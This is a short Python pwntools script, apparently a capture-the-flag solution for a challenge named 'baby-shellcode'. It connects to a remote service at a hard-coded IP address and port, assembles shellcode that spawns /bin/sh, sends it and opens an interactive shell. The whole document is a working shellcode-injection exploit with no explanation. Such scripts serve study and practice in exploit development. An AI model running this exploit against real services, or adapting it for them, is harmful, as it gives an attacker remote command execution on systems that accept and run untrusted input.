import pwn
from pwn import*

elf=pwn.ELF("./baby-shellcode")
p=elf.process()
r=remote("34.28.147.7",5000)

pwn.context.binary=elf

shellcode=pwn.shellcraft.sh()
shellcode=pwn.asm(shellcode)

r.sendline(shellcode)
r.interactive()